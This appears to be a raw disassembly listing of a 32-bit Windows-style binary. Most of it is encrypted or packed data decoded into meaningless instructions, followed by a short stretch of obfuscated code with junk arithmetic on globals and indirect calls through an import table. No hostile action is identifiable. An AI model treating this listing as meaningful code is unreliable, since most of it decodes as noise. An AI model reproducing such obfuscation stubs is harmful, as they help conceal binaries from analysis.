  40d0ad:	stos   BYTE PTR es:[edi],al
  40d0ae:	gs sbb al,0x4f
  40d0b1:	dec    ebx
  40d0b2:	xchg   ebp,eax
  40d0b3:	ret    
  40d0b4:	rol    esi,cl
  40d0b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0b7:	push   0x807e53aa
  40d0bc:	repz and esp,edx
  40d0bf:	mov    ebx,0x44bdeb66
  40d0c4:	std    
  40d0c5:	(bad)  
  40d0c6:	mov    ebp,0xa377eaaf
  40d0cb:	aad    0x43
  40d0cd:	ins    BYTE PTR es:[edi],dx
  40d0ce:	stos   DWORD PTR es:[edi],eax
  40d0cf:	je     0x40d0f9
  40d0d1:	out    dx,al
  40d0d2:	mov    ebx,0xd5c50a9f
  40d0d7:	mov    dl,0xbf
  40d0d9:	xor    bl,BYTE PTR [eax]
  40d0db:	es sti 
  40d0dd:	dec    eax
  40d0de:	test   DWORD PTR [ebx],0x85b3b220
  40d0e4:	ret    0xb493
  40d0e7:	jg     0x40d0cf
  40d0e9:	jge    0x40d0cf
  40d0eb:	fadd   st(3),st
  40d0ed:	(bad)  
  40d0ee:	and    al,0xb5
  40d0f0:	adc    BYTE PTR [esi],0xa5
  40d0f3:	pop    ss
  40d0f4:	test   al,0x7d
  40d0f6:	rcl    DWORD PTR [edx-0x279f8b74],cl
  40d0fc:	adc    BYTE PTR [esi+0x454b4761],cl
  40d102:	lock mov bh,0x78
  40d105:	xor    cl,ch
  40d107:	add    al,0xbf
  40d109:	cmp    ebp,DWORD PTR [edi-0x1b]
  40d10c:	and    esp,esp
  40d10e:	lds    edx,FWORD PTR [esi+ebp*2]
  40d111:	jns    0x40d127
  40d113:	mov    es,eax
  40d115:	adc    BYTE PTR [ecx+ecx*2+0x3c],0xfd
  40d11a:	push   ebp
  40d11b:	pop    ebx
  40d11c:	dec    edi
  40d11d:	jecxz  0x40d0fd
  40d11f:	out    0x3a,eax
  40d121:	jbe    0x40d16e
  40d123:	push   esp
  40d124:	in     eax,dx
  40d125:	xchg   edi,eax
  40d126:	mov    ebx,0xfce61dd
  40d12b:	and    BYTE PTR [esi-0x25d22fc],0xa8
  40d132:	mov    esi,0x5ec531ac
  40d137:	sub    DWORD PTR [ecx+ebx*2+0x3c4340f5],ebp
  40d13e:	nop
  40d13f:	je     0x40d0ca
  40d141:	pop    es
  40d142:	add    eax,0x3c7bec79
  40d147:	or     eax,0x6ffe107b
  40d14c:	pop    esi
  40d14d:	fcomp  QWORD PTR [edi-0x21]
  40d150:	lahf   
  40d151:	jmp    0x40d198
  40d153:	xchg   ebp,eax
  40d154:	mov    esp,0x6fe2d7ff
  40d159:	mov    esp,0x192386dd
  40d15e:	and    DWORD PTR [esi+ecx*8+0x7a3d91ab],esi
  40d165:	jecxz  0x40d0ee
  40d167:	imul   ebx,DWORD PTR [edi],0x80f2986a
  40d16d:	je     0x40d1d6
  40d16f:	add    DWORD PTR [ebx],esp
  40d171:	sub    eax,0xc9e9b882
  40d176:	push   edi
  40d177:	fadd   DWORD PTR [eax+0x41]
  40d17a:	pusha  
  40d17b:	mov    eax,ds:0xd9676431
  40d180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d181:	(bad)  
  40d182:	pusha  
  40d183:	inc    edx
  40d184:	xchg   esi,eax
  40d185:	lahf   
  40d186:	mov    edx,0x908eb1a4
  40d18b:	and    DWORD PTR gs:[ecx],edx
  40d18e:	das    
  40d18f:	mov    esi,0x168c2c3
  40d195:	and    DWORD PTR ds:0x6c15ecea,0x6547e79c
  40d19f:	into   
  40d1a0:	add    al,0x7a
  40d1a2:	sub    DWORD PTR [ebx-0x54a073ff],esi
  40d1a8:	mov    ebp,0xaf7f952a
  40d1ad:	inc    ecx
  40d1ae:	inc    eax
  40d1af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1b0:	sbb    ah,BYTE PTR [esi+ebx*4+0x3b]
  40d1b4:	mov    ecx,DWORD PTR [edi-0x3a]
  40d1b7:	pop    ebx
  40d1b8:	add    BYTE PTR [esi+0x58d700d7],ch
  40d1be:	std    
  40d1bf:	jg     0x40d1ed
  40d1c1:	jmp    0x407c:0x2427d01c
  40d1c8:	mov    ebp,0x8b46a934
  40d1cd:	stos   DWORD PTR es:[edi],eax
  40d1ce:	jb     0x40d1fc
  40d1d0:	push   0x7a
  40d1d2:	mov    ch,0x92
  40d1d4:	xchg   BYTE PTR [ecx],al
  40d1d6:	js     0x40d222
  40d1d8:	lds    esp,FWORD PTR [ecx-0xd3b8536]
  40d1de:	dec    eax
  40d1df:	stc    
  40d1e0:	add    BYTE PTR [eax],0x97
  40d1e3:	xchg   BYTE PTR [ebp-0xaa7c14c],dh
  40d1e9:	xor    ebx,DWORD PTR [ebx]
  40d1eb:	ficomp WORD PTR [edx+edi*1]
  40d1ee:	pop    ecx
  40d1ef:	dec    eax
  40d1f0:	dec    edi
  40d1f1:	(bad)  
  40d1f2:	fstp   TBYTE PTR [edx+0x1f45d878]
  40d1f8:	std    
  40d1f9:	xchg   DWORD PTR [eax],esp
  40d1fb:	lods   eax,DWORD PTR ds:[esi]
  40d1fc:	jmp    0x93dc:0xdc5a8e7f
  40d203:	adc    BYTE PTR [esi-0x74683e46],0xe
  40d20a:	int    0xe5
  40d20c:	dec    esp
  40d20d:	fs inc ebx
  40d20f:	add    al,BYTE PTR [edx-0x48]
  40d212:	jle    0x40d1ac
  40d214:	dec    ebp
  40d215:	pop    edx
  40d216:	cld    
  40d217:	aas    
  40d218:	std    
  40d219:	sbb    BYTE PTR ds:0xa4dc058a,cl
  40d21f:	sbb    bh,BYTE PTR [ebx-0x76a8b321]
  40d225:	lea    ebx,[edi+eiz*8]
  40d228:	sahf   
  40d229:	pop    edx
  40d22a:	cmp    DWORD PTR [edi],0xffffffc6
  40d22d:	fwait
  40d22e:	stos   BYTE PTR es:[edi],al
  40d22f:	and    edi,DWORD PTR ds:[ebx+0x912f40f]
  40d236:	fs repnz mov dl,0x3a
  40d23a:	scas   eax,DWORD PTR es:[edi]
  40d23b:	push   ds
  40d23c:	dec    ecx
  40d23d:	jl     0x40d269
  40d23f:	gs loope 0x40d2b3
  40d242:	(bad)  
  40d244:	push   0xc5894070
  40d249:	dec    esp
  40d24a:	push   esi
  40d24b:	retf   0xb9a4
  40d24e:	sbb    eax,0x13a3b600
  40d253:	push   ebp
  40d254:	pushf  
  40d255:	cmp    edx,DWORD PTR [eax+0x500e7650]
  40d25b:	fs popa 
  40d25d:	ss sbb dh,cl
  40d260:	and    BYTE PTR [ecx-0x391400da],bh
  40d266:	jecxz  0x40d2e0
  40d268:	mov    ch,0x24
  40d26a:	cmp    BYTE PTR [esi],dl
  40d26c:	push   esi
  40d26d:	pushf  
  40d26e:	pop    esi
  40d26f:	sbb    al,0x9a
  40d271:	mov    eax,ds:0x40107df8
  40d276:	inc    esp
  40d277:	push   ebx
  40d278:	mov    ecx,0xbffd40b
  40d27d:	sbb    eax,0x68bc64af
  40d282:	ficomp WORD PTR [ebx+0x66]
  40d285:	in     eax,dx
  40d286:	into   
  40d287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d288:	repz fdiv DWORD PTR [ebp+0x44c029d]
  40d28f:	imul   ebx,ebx,0x4a64f44f
  40d295:	shl    BYTE PTR [eax],1
  40d297:	add    BYTE PTR [ebp+0x71],bl
  40d29a:	or     ebp,0x23
  40d29d:	cld    
  40d29e:	scas   eax,DWORD PTR es:[edi]
  40d29f:	clc    
  40d2a0:	dec    ecx
  40d2a1:	and    DWORD PTR gs:[edi],edx
  40d2a4:	fwait
  40d2a5:	sbb    eax,0xe2ce80c8
  40d2aa:	and    ah,BYTE PTR [edx-0x7d]
  40d2ad:	push   ecx
  40d2ae:	test   DWORD PTR [esi+ebp*1],eax
  40d2b1:	ins    DWORD PTR es:[edi],dx
  40d2b2:	gs pushf 
  40d2b4:	jp     0x40d28d
  40d2b6:	and    al,0x39
  40d2b8:	mov    eax,0x5c5fab9f
  40d2bd:	and    al,0x97
  40d2bf:	jo     0x40d2a2
  40d2c1:	outs   dx,DWORD PTR ds:[esi]
  40d2c2:	mov    ah,0x13
  40d2c4:	fs (bad) 
  40d2c6:	xchg   ebp,eax
  40d2c7:	pop    DWORD PTR [eax+0x4679c7b]
  40d2cd:	arpl   si,bx
  40d2cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2d0:	pop    ecx
  40d2d1:	push   cs
  40d2d2:	je     0x40d260
  40d2d4:	dec    edx
  40d2d5:	lods   eax,DWORD PTR ds:[esi]
  40d2d6:	add    ebp,DWORD PTR [eax+ecx*4-0x71e237a]
  40d2dd:	cs pop ebp
  40d2df:	std    
  40d2e0:	in     eax,0x44
  40d2e2:	icebp  
  40d2e3:	pop    ecx
  40d2e4:	sbb    ecx,esp
  40d2e6:	and    BYTE PTR [ebx-0x73c4e75f],al
  40d2ec:	mov    ecx,ss
  40d2ee:	sbb    al,0xf5
  40d2f0:	sahf   
  40d2f1:	loopne 0x40d331
  40d2f3:	jl     0x40d318
  40d2f5:	adc    eax,0xc475920a
  40d2fa:	cmp    eax,0x8c22de7d
  40d2ff:	or     dl,al
  40d301:	mov    ah,0xf3
  40d303:	sar    DWORD PTR [ebx],1
  40d305:	cli    
  40d306:	adc    BYTE PTR [esi-0x2e17bec3],bl
  40d30c:	xlat   BYTE PTR ds:[ebx]
  40d30d:	mov    edi,0x6995de00
  40d312:	mov    WORD PTR [ebx+esi*1+0x143caf15],ss
  40d319:	jl     0x40d2e6
  40d31b:	enter  0xa01e,0x3
  40d31f:	push   ss
  40d320:	in     eax,dx
  40d321:	ds pushf 
  40d323:	int3   
  40d324:	add    al,0x5f
  40d326:	(bad)  
  40d327:	(bad)  
  40d329:	sahf   
  40d32a:	shr    DWORD PTR ds:0x4b66daf4,1
  40d330:	sub    DWORD PTR [edx],esi
  40d332:	push   0xffffffc8
  40d334:	xchg   esi,eax
  40d335:	das    
  40d336:	sbb    DWORD PTR [edx-0x3e],eax
  40d339:	sub    BYTE PTR [ecx+edx*1],dl
  40d33c:	test   BYTE PTR [edi-0x71],al
  40d33f:	bound  edi,QWORD PTR [ecx+0x731f7ca7]
  40d345:	loope  0x40d39d
  40d347:	retf   
  40d348:	mov    al,ds:0x2fab2fbb
  40d34d:	int3   
  40d34e:	stos   BYTE PTR es:[edi],al
  40d34f:	xor    dh,BYTE PTR [ecx]
  40d351:	repz rcr BYTE PTR es:[edi-0x5b],cl
  40d356:	inc    ebx
  40d357:	push   edx
  40d358:	(bad)  
  40d359:	loope  0x40d32e
  40d35b:	jo     0x40d2df
  40d35d:	sub    eax,0xce8b06b2
  40d362:	call   0xfcdf1b3c
  40d367:	mov    dh,0x44
  40d369:	loop   0x40d3d3
  40d36b:	mov    ecx,0xf34c0c24
  40d370:	xor    dh,ah
  40d372:	jno    0x40d36e
  40d374:	lods   eax,DWORD PTR ds:[esi]
  40d375:	push   ds
  40d376:	fsubr  QWORD PTR [edx]
  40d378:	mov    cl,al
  40d37a:	pop    ecx
  40d37b:	sbb    DWORD PTR [esi],ebx
  40d37d:	add    BYTE PTR [esp+eiz*2-0xd],dh
  40d381:	add    DWORD PTR [edx],ebp
  40d383:	ins    BYTE PTR es:[edi],dx
  40d384:	(bad)  
  40d385:	mov    edi,DWORD PTR [ebp-0xc]
  40d388:	xor    edi,eax
  40d38a:	sub    edx,edi
  40d38c:	mov    edi,DWORD PTR [ebp-0xc]
  40d38f:	mov    ebx,DWORD PTR [ebp-0x14]
  40d392:	xor    edi,eax
  40d394:	add    edi,ecx
  40d396:	imul   edi,ebx
  40d399:	mov    ebx,DWORD PTR [ebp-0x18]
  40d39c:	xor    ebx,eax
  40d39e:	sub    edx,ecx
  40d3a0:	lea    edi,[edi+ebx*1+0x32729a]
  40d3a7:	cmp    edi,edx
  40d3a9:	jbe    0x40c541
  40d3af:	mov    edx,DWORD PTR [ebp-0xc]
  40d3b2:	mov    edi,DWORD PTR [ebp-0x24]
  40d3b5:	jmp    0x40d728
  40d3ba:	mov    ebx,0xd1887f92
  40d3bf:	popf   
  40d3c0:	dec    ebx
  40d3c1:	pop    ebp
  40d3c2:	stc    
  40d3c3:	ss push edi
  40d3c5:	xchg   ebp,eax
  40d3c6:	xor    eax,DWORD PTR [ebx+0x17]
  40d3c9:	xchg   DWORD PTR [edi-0x68],ebp
  40d3cc:	jl     0x40d44a
  40d3ce:	retf   0x7c79
  40d3d1:	jl     0x40d38e
  40d3d3:	mov    DWORD PTR [esi-0x4f4c08fb],edi
  40d3d9:	xlat   BYTE PTR ds:[ebx]
  40d3da:	bound  esi,QWORD PTR [esi-0x15]
  40d3dd:	pop    eax
  40d3de:	retf   
  40d3df:	and    al,0xed
  40d3e1:	dec    eax
  40d3e2:	lea    esp,[ebp+ebx*2+0x7ef52a07]
  40d3e9:	fist   DWORD PTR [ebp-0xae7dcb9]
  40d3ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3f0:	cmp    eax,edi
  40d3f2:	push   0x299808e2
  40d3f7:	fwait
  40d3f8:	xor    al,0x6e
  40d3fa:	imul   ecx,DWORD PTR [ecx+0x3cd7b6fc],0xe00c2535
  40d404:	loopne 0x40d3dc
  40d406:	push   ebx
  40d407:	(bad)  
  40d408:	ret    
  40d409:	xor    esi,DWORD PTR ds:0x48c03acb
  40d40f:	je     0x40d48d
  40d411:	pop    ebx
  40d412:	push   ecx
  40d413:	std    
  40d414:	and    DWORD PTR [esp+ebp*8],ecx
  40d417:	sub    DWORD PTR [ecx-0x30],esi
  40d41a:	push   esp
  40d41b:	dec    esi
  40d41c:	cwde   
  40d41d:	xlat   BYTE PTR ds:[ebx]
  40d41e:	sti    
  40d41f:	lea    esp,[ecx+eiz*1-0x42aea2c]
  40d426:	mov    eax,ds:0x39b0ad78
  40d42b:	sub    al,0x4
  40d42d:	sub    DWORD PTR [edi],esp
  40d42f:	or     ch,BYTE PTR [ebx-0x408ef8d0]
  40d435:	mov    al,ds:0xb9660886
  40d43a:	rcr    DWORD PTR [ecx-0x21],0x87
  40d43e:	mov    DWORD PTR [edi+0xa],edi
  40d441:	test   bl,bl
  40d443:	pop    ss
  40d444:	push   ecx
  40d445:	cmp    eax,0xc120a3c
  40d44a:	fwait
  40d44b:	lods   eax,DWORD PTR ds:[esi]
  40d44c:	pop    es
  40d44d:	fldcw  WORD PTR [ecx+ecx*4]
  40d450:	adc    bh,BYTE PTR [ecx-0x2]
  40d453:	mov    esp,0x3c505111
  40d458:	call   0x4b90:0xf228a704
  40d45f:	jae    0x40d4c2
  40d461:	dec    ebx
  40d462:	rol    cl,0x97
  40d465:	dec    esp
  40d466:	push   ebp
  40d467:	lock push edi
  40d469:	mov    esi,DWORD PTR [eax+0x523f3b76]
  40d46f:	jmp    0x50f0fd89
  40d474:	jno    0x40d458
  40d476:	jb     0x40d4f6
  40d478:	aas    
  40d479:	add    eax,0xd202a962
  40d47e:	push   ds
  40d47f:	call   0x1248cc5f
  40d484:	add    DWORD PTR [edi+0x1b6ca4b1],edi
  40d48a:	mov    edi,0xb2faf50d
  40d48f:	test   BYTE PTR [edx+0x26],bh
  40d492:	popf   
  40d493:	jg     0x40d43e
  40d495:	ret    0x3b6c
  40d498:	popa   
  40d499:	call   0xee69d77c
  40d49e:	xor    eax,0xcc43d708
  40d4a3:	push   cs
  40d4a4:	xor    ah,al
  40d4a6:	pop    esi
  40d4a7:	inc    ebp
  40d4a8:	adc    DWORD PTR [ebx+0x19],0x53
  40d4ac:	add    edi,ecx
  40d4ae:	into   
  40d4af:	adc    al,0x68
  40d4b1:	pop    es
  40d4b2:	mov    dl,0xf3
  40d4b4:	sub    ebx,DWORD PTR ds:0x3aa65334
  40d4ba:	sub    bl,BYTE PTR [esi+0x14504f6e]
  40d4c0:	ror    DWORD PTR fs:[edi-0x1a],1
  40d4c4:	xor    edx,eax
  40d4c6:	(bad)  
  40d4c7:	cmc    
  40d4c8:	xor    eax,0x87ffd69b
  40d4cd:	fisub  WORD PTR [si+0x17]
  40d4d1:	(bad)  
  40d4d2:	adc    ah,BYTE PTR [eax+0x3c]
  40d4d5:	sbb    al,0x6
  40d4d7:	je     0x40d483
  40d4d9:	aad    0xca
  40d4db:	in     al,dx
  40d4dc:	mov    ebp,0xb35363d3
  40d4e1:	xor    esp,DWORD PTR [edx+0x55]
  40d4e4:	stc    
  40d4e5:	sbb    DWORD PTR [ebx-0x70351a57],0xffffff91
  40d4ec:	cmp    al,0xae
  40d4ee:	test   bh,0x11
  40d4f1:	sub    cl,dl
  40d4f3:	push   esi
  40d4f4:	and    al,BYTE PTR [edi]
  40d4f6:	pushf  
  40d4f7:	or     eax,0x5ad3620c
  40d4fc:	js     0x40d4e0
  40d4fe:	inc    ebp
  40d4ff:	aaa    
  40d500:	rdtsc  
  40d502:	and    eax,DWORD PTR [ebp-0x7c]
  40d505:	mov    ah,0x60
  40d507:	push   esp
  40d508:	sbb    BYTE PTR [edi+0x7d],cl
  40d50b:	sbb    bl,BYTE PTR [eax+0xa]
  40d50e:	jge    0x40d574
  40d510:	cmp    esi,DWORD PTR [edi-0x5f]
  40d513:	and    bl,dh
  40d515:	adc    esi,edi
  40d517:	retf   0x54c1
  40d51a:	pop    esi
  40d51b:	(bad)  
  40d51c:	fcmovu st,st(5)
  40d51e:	mov    ch,0xe1
  40d520:	pop    es
  40d521:	mov    ?,WORD PTR [eax-0x41]
  40d524:	xor    eax,0x7cdefb70
  40d529:	jecxz  0x40d598
  40d52b:	fcmovb st,st(1)
  40d52d:	daa    
  40d52e:	out    0xc7,eax
  40d530:	push   ds
  40d531:	add    BYTE PTR [ecx-0x67778fab],dl
  40d537:	fnstenv [ebp+0x37]
  40d53a:	push   ecx
  40d53b:	hlt    
  40d53c:	sub    cl,BYTE PTR [ecx-0x4175d592]
  40d542:	push   ebp
  40d543:	je     0x40d590
  40d545:	or     eax,0x830702e2
  40d54a:	mov    edx,cr6
  40d54d:	fsub   DWORD PTR es:[ecx+0x45d2a860]
  40d554:	adc    edx,DWORD PTR es:[esi-0x26029591]
  40d55b:	push   ebx
  40d55c:	lds    eax,FWORD PTR [ebx+ebp*2]
  40d55f:	push   ecx
  40d560:	stos   DWORD PTR es:[edi],eax
  40d561:	or     bh,BYTE PTR [ecx+0x34f38fc6]
  40d567:	jo     0x40d561
  40d569:	sahf   
  40d56a:	and    al,0x3c
  40d56c:	mov    esi,esp
  40d56e:	push   cs
  40d56f:	xor    eax,0x2fbda162
  40d574:	pop    es
  40d575:	stos   BYTE PTR es:[edi],al
  40d576:	loop   0x40d547
  40d578:	cmp    BYTE PTR [eax+ebx*1],ch
  40d57b:	add    edi,DWORD PTR [eax-0x6b7600fd]
  40d581:	cmp    ecx,DWORD PTR [ecx-0x29ff434f]
  40d587:	(bad)  
  40d588:	cmp    BYTE PTR [ecx+0x6a6cd687],al
  40d58e:	outs   dx,BYTE PTR ds:[esi]
  40d58f:	test   al,0xcd
  40d591:	sbb    DWORD PTR [ebp+ecx*8-0x46aeb8ad],ecx
  40d598:	outs   dx,DWORD PTR ds:[esi]
  40d599:	xlat   BYTE PTR ds:[ebx]
  40d59a:	adc    dl,BYTE PTR [ecx+0x5e944f5c]
  40d5a0:	pop    ebp
  40d5a1:	pusha  
  40d5a2:	hlt    
  40d5a3:	pop    ecx
  40d5a4:	cli    
  40d5a5:	mov    ebx,0xb8d57b86
  40d5aa:	sahf   
  40d5ab:	mov    ds:0x900a4c0c,eax
  40d5b0:	out    dx,al
  40d5b1:	jmp    0xcdcf5dd
  40d5b6:	mov    ebx,DWORD PTR gs:[eax-0x73cb3333]
  40d5bd:	push   edi
  40d5be:	sbb    dh,BYTE PTR [ebx-0x35]
  40d5c1:	outs   dx,BYTE PTR ds:[esi]
  40d5c2:	mov    ch,0x0
  40d5c4:	fst    QWORD PTR [esi-0x4b230bf2]
  40d5ca:	(bad)  
  40d5cb:	sbb    edi,DWORD PTR [eax+0x1071038c]
  40d5d1:	add    ebx,DWORD PTR [edx]
  40d5d3:	sub    eax,0xc901bbb3
  40d5d8:	jecxz  0x40d60d
  40d5da:	imul   ecx,DWORD PTR [ebp-0x76],0x71b5e7e6
  40d5e1:	push   edx
  40d5e2:	add    DWORD PTR [esi+0x3c3d0c38],ecx
  40d5e8:	xor    eax,0x201a2122
  40d5ed:	in     eax,0x3a
  40d5ef:	loopne 0x40d5ce
  40d5f1:	imul   edi,DWORD PTR [ebp+0x7f],0xffffffc1
  40d5f5:	imul   edx,DWORD PTR [edi-0x5732f53a],0xb
  40d5fc:	iret   
  40d5fd:	push   0x748c83ab
  40d602:	ja     0x40d5fd
  40d604:	(bad)  
  40d605:	jmp    DWORD PTR [ebx+0x0]
  40d608:	loopne 0x40d5a1
  40d60a:	add    BYTE PTR [esp+edi*8+0x57],dl
  40d60e:	fwait
  40d60f:	push   ecx
  40d610:	and    BYTE PTR [esi],cl
  40d612:	mov    ah,0x15
  40d614:	imul   esp,DWORD PTR [eax+ecx*8+0x7e],0xffffffa2
  40d619:	pop    edx
  40d61a:	es cld 
  40d61c:	pop    ebx
  40d61d:	pop    ebp
  40d61e:	popa   
  40d61f:	mov    ah,0x70
  40d621:	sub    al,bh
  40d623:	inc    ebp
  40d624:	push   ebx
  40d626:	mov    ds:0x60bb2948,eax
  40d62b:	cmp    DWORD PTR [edi],eax
  40d62d:	aas    
  40d62e:	retf   0xd98b
  40d631:	sti    
  40d632:	popf   
  40d633:	add    DWORD PTR [eax+0x20],ecx
  40d636:	shl    DWORD PTR [edi-0x1f050de0],1
  40d63c:	pop    edx
  40d63d:	xor    DWORD PTR [esp+eiz*8],esi
  40d640:	jne    0x40d62c
  40d642:	xlat   BYTE PTR ds:[ebx]
  40d643:	les    edx,FWORD PTR [edx+0x6544427a]
  40d649:	pop    ss
  40d64a:	push   es
  40d64b:	hlt    
  40d64c:	cmp    al,0x4f
  40d64e:	pop    ecx
  40d64f:	aad    0xee
  40d651:	jecxz  0x40d648
  40d653:	pop    edx
  40d654:	mov    ebx,0x313c99d8
  40d659:	rol    bh,0xfc
  40d65c:	mov    edi,0x1ea10ca0
  40d661:	(bad)  
  40d662:	dec    DWORD PTR [edi*8-0x15bff930]
  40d669:	push   edx
  40d66a:	push   edx
  40d66b:	fisub  WORD PTR [edi+esi*4]
  40d66e:	push   esp
  40d66f:	ds in  eax,dx
  40d671:	lods   eax,DWORD PTR ds:[esi]
  40d672:	mov    ebp,DWORD PTR [esi+0x3d]
  40d675:	pop    ecx
  40d676:	or     BYTE PTR [ecx],dh
  40d678:	sub    DWORD PTR [eax+ecx*2],eax
  40d67b:	xchg   edx,eax
  40d67c:	cmp    DWORD PTR [ebp+0x32],edi
  40d67f:	xchg   ebx,eax
  40d680:	xor    al,0xae
  40d682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d683:	jp     0x40d6c1
  40d685:	ins    DWORD PTR es:[edi],dx
  40d686:	fsub   QWORD PTR [esi+0x5b65f100]
  40d68c:	add    edi,DWORD PTR ds:0x5a59d2f1
  40d692:	pop    ecx
  40d693:	jle    0x40d6af
  40d695:	outs   dx,DWORD PTR ds:[esi]
  40d696:	popa   
  40d697:	pop    ds
  40d698:	sbb    al,0x60
  40d69a:	and    eax,0xbf91d2f5
  40d69f:	push   ss
  40d6a0:	cdq    
  40d6a1:	inc    esi
  40d6a2:	mov    DWORD PTR [ecx-0x59ecbe82],ecx
  40d6a8:	mov    al,ds:0xa41dbf45
  40d6ad:	loopne 0x40d66b
  40d6af:	nop
  40d6b0:	leave  
  40d6b1:	dec    ebp
  40d6b2:	pop    esi
  40d6b3:	imul   esi,DWORD PTR [ebx+eiz*2+0x2c],0xe35834bc
  40d6bb:	mov    dl,0x9a
  40d6bd:	retfw  0xdf0a
  40d6c1:	adc    eax,ebx
  40d6c3:	dec    ebp
  40d6c4:	std    
  40d6c5:	mov    al,0xbe
  40d6c7:	je     0x40d6a7
  40d6c9:	jbe    0x40d71b
  40d6cb:	or     esi,DWORD PTR [ebp-0xd2b4997]
  40d6d1:	retf   0x37f3
  40d6d4:	iret   
  40d6d5:	cld    
  40d6d6:	inc    ebx
  40d6d7:	xchg   edx,eax
  40d6d8:	stc    
  40d6d9:	xor    BYTE PTR [ecx],ah
  40d6db:	fisubr DWORD PTR [eax-0x67de5a]
  40d6e1:	je     0x40d6ed
  40d6e3:	nop
  40d6e4:	and    eax,0x50a3140a
  40d6e9:	sbb    BYTE PTR [edi],dh
  40d6eb:	or     eax,0x88361390
  40d6f0:	dec    ecx
  40d6f1:	mov    esp,0x5a315f0c
  40d6f6:	enter  0xc264,0xd9
  40d6fa:	mov    ah,BYTE PTR [edi]
  40d6fc:	xor    ebx,DWORD PTR [eax]
  40d6fe:	sub    eax,0x6607000f
  40d703:	test   al,0x90
  40d705:	push   edi
  40d707:	mov    ds:0xceb4d0d7,al
  40d70c:	clc    
  40d70d:	out    0x26,al
  40d70f:	xor    BYTE PTR [eax],ch
  40d711:	lea    ebx,[ebp+0x37]
  40d714:	mov    ds:0x91757fec,al
  40d719:	inc    esp
  40d71a:	and    al,0x6c
  40d71c:	(bad)  
  40d71d:	test   al,0xf6
  40d71f:	push   cs
  40d720:	shl    BYTE PTR [edx-0x2b5b7448],cl
  40d726:	nop
  40d727:	loope  0x40d75c
  40d729:	rol    BYTE PTR [ebx],1
  40d72b:	ror    DWORD PTR [edi],1
  40d72d:	scas   eax,DWORD PTR es:[edi]
  40d72e:	xlat   BYTE PTR ds:[ebx]
  40d72f:	mov    edi,DWORD PTR [ebp-0x18]
  40d732:	xor    edi,eax
  40d734:	add    edx,edi
  40d736:	mov    edi,DWORD PTR [ebp-0x8]
  40d739:	lea    edx,[edx+edi*1+0x32729a]
  40d740:	mov    DWORD PTR [ebp-0x8],edx
  40d743:	mov    edx,DWORD PTR [ebp-0x20]
  40d746:	xor    edx,eax
  40d748:	mov    edi,0xffcd8d66
  40d74d:	sub    edi,edx
  40d74f:	add    edi,DWORD PTR [ebp-0x10]
  40d752:	mov    edx,DWORD PTR [ebp-0x20]
  40d755:	mov    ebx,DWORD PTR [ebp-0x8]
  40d758:	xor    edx,eax
  40d75a:	add    edx,ecx
  40d75c:	imul   edx,ebx
  40d75f:	cmp    edx,edi
  40d761:	jbe    0x40a06e
  40d767:	pop    ebx
  40d768:	pop    edi
  40d769:	leave  
  40d76a:	ret    0x8
  40d76d:	push   ebp
  40d76e:	mov    ebp,esp
  40d770:	sub    esp,0xa8
  40d776:	and    DWORD PTR ds:0x43359b,0x6624
  40d780:	push   ebx
  40d781:	adc    DWORD PTR ds:0x433563,0x6b43
  40d78b:	push   esi
  40d78c:	push   edi
  40d78d:	sbb    DWORD PTR ds:0x43361f,0x4335a7
  40d797:	push   0x413c96
  40d79c:	sub    DWORD PTR ds:0x43354b,0x433663
  40d7a6:	call   DWORD PTR ds:0x412194
  40d7ac:	push   0x413cbe
  40d7b1:	sub    DWORD PTR ds:0x433623,0x43353f
  40d7bb:	call   DWORD PTR ds:0x412174
  40d7c1:	test   eax,eax
  40d7c3:	je     0x40d7d1
  40d7c9:	push   0x2
  40d7cb:	pop    eax
  40d7cc:	jmp    0x40e1cc
  40d7d1:	and    DWORD PTR ds:0x4335b3,0x0
  40d7db:	xor    ecx,ecx
  40d7dd:	xor    ecx,DWORD PTR ds:0x4335b3
  40d7e3:	inc    ecx
  40d7e4:	mov    DWORD PTR ds:0x4335b3,ecx
  40d7ea:	cmp    DWORD PTR ds:0x4335b3,0x24
  40d7f1:	jne    0x40d80b
  40d7f7:	push   DWORD PTR [ebp-0x28]
  40d7fa:	push   DWORD PTR [ebp-0x20]
  40d7fd:	push   0x38c3
  40d802:	push   DWORD PTR [ebp-0x14]
  40d805:	call   DWORD PTR ds:0x412274
  40d80b:	cmp    DWORD PTR ds:0x4335b3,0x1e
  40d812:	jb     0x40d7db
  40d818:	or     DWORD PTR ds:0x433547,0x433667
  40d822:	mov    DWORD PTR [ebp-0x24],0xf89c8535
  40d829:	dec    ecx
  40d82a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40d831:	add    ecx,ecx
  40d833:	lea    eax,[ebp-0x2c]
  40d836:	and    DWORD PTR ds:0x43354f,0x0
  40d840:	jmp    0x40d852
  40d845:	mov    ecx,DWORD PTR ds:0x43354f
  40d84b:	inc    ecx
  40d84c:	mov    DWORD PTR ds:0x43354f,ecx
  40d852:	cmp    DWORD PTR ds:0x43354f,0x10
  40d859:	jae    0x40d899
  40d85f:	cmp    DWORD PTR ds:0x43354f,0x4
  40d866:	jne    0x40d87a
  40d86c:	push   0x42d1
  40d871:	push   DWORD PTR [ebp-0x28]
  40d874:	call   DWORD PTR ds:0x4121a0
  40d87a:	cmp    DWORD PTR ds:0x43354f,0x3
  40d881:	jne    0x40d894
  40d887:	mov    ecx,DWORD PTR ds:0x43354f
  40d88d:	inc    ecx
  40d88e:	mov    DWORD PTR ds:0x43354f,ecx
  40d894:	jmp    0x40d845
  40d899:	mov    DWORD PTR [ebp-0x18],eax
  40d89c:	xor    esi,esi
  40d89e:	add    esi,DWORD PTR ds:0x43361b
  40d8a4:	add    esi,DWORD PTR ds:0x4335e3
  40d8aa:	mov    DWORD PTR ds:0x43361b,esi
  40d8b0:	lea    eax,[ebp-0x30]
  40d8b3:	inc    edi
  40d8b4:	mov    DWORD PTR [ebp-0x14],eax
  40d8b7:	mov    eax,ds:0x433547
  40d8bc:	and    eax,DWORD PTR ds:0x4335af
  40d8c2:	mov    ds:0x433547,eax
  40d8c7:	mov    eax,ds:0x413b16
  40d8cc:	sbb    DWORD PTR ds:0x433553,ebx
  40d8d2:	mov    eax,DWORD PTR [eax+0x1c8]
